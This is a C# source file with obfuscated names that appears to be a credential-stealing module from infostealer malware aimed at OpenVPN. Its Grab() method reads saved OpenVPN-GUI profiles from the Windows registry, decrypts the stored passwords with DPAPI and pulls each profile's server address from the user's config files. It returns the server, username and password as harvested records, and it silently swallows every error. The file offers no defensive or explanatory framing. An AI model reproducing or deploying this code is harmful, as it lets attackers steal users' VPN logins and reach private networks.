using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using C6Zy;
using Microsoft.Win32;

namespace rk937aHHc
{
	public class OpenVPN : EtbH
	{
		public OpenVPN()
		{
			this.smdvCvqJ = "OpenVPN";
		}
		public string smdvCvqJ { get; set; }

		public List<WTitxI2m> Grab()
		{
			List<WTitxI2m> list = new List<WTitxI2m>();

			try
			{
				using (RegistryKey baseKey =
					Registry.CurrentUser.OpenSubKey(@"Software\OpenVPN-GUI\configs", false))
				{
					if (baseKey == null)
						return list;

					foreach (string configName in baseKey.GetSubKeyNames())
					{
						try
						{
							using (RegistryKey configKey =
								baseKey.OpenSubKey(configName, false))
							{
								if (configKey == null)
									continue;

								string username = Encoding.Unicode.GetString(
									(byte[])configKey.GetValue("username")
								);

								byte[] authData =
									(byte[])configKey.GetValue("auth-data");

								byte[] entropy =
									(byte[])configKey.GetValue("entropy");

								Array.Resize(ref entropy, entropy.Length - 1);

								string password =
									OpenVPN.FVl4j(authData, entropy);

								list.Add(new WTitxI2m
								{
									data1 = OpenVPN.NdU8Gl(configName),
									data2 = username,
									data3 = password,
									data4 = this.smdvCvqJ
								});
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
				return new List<WTitxI2m>();
			}

			return list;
		}

		private static string NdU8Gl(string profileName)
		{
			try
			{
				string configDir =
					Environment.GetEnvironmentVariable("USERPROFILE") +
					"\\OpenVPN\\config\\";

				string configPath = OpenVPN.dDo(configDir, profileName);

				if (string.IsNullOrEmpty(configPath) || !File.Exists(configPath))
					return "";

				string[] lines = File.ReadAllLines(configPath);

				foreach (string line in lines)
				{
					if (line.StartsWith("remote "))
					{
						return line.Replace("remote ", "");
					}
				}
			}
			catch
			{
			}

			return "";
		}

		private static string dDo(string directoryPath, string keyword)
		{
			try
			{
				string[] files = Directory.GetFiles(directoryPath);

				foreach (string file in files)
				{
					if (file.Contains(keyword))
					{
						return file;
					}
				}
			}
			catch
			{
			}

			return null;
		}

		private static string FVl4j(byte[] encryptedData, byte[] entropy)
		{
			if (encryptedData == null || encryptedData.Length == 0)
				return null;

			try
			{
				byte[] decrypted = ProtectedData.Unprotect(
					encryptedData,
					entropy,
					DataProtectionScope.CurrentUser
				);

				return Encoding.Unicode.GetString(decrypted);
			}
			catch
			{
				return null;
			}
		}
	}
}
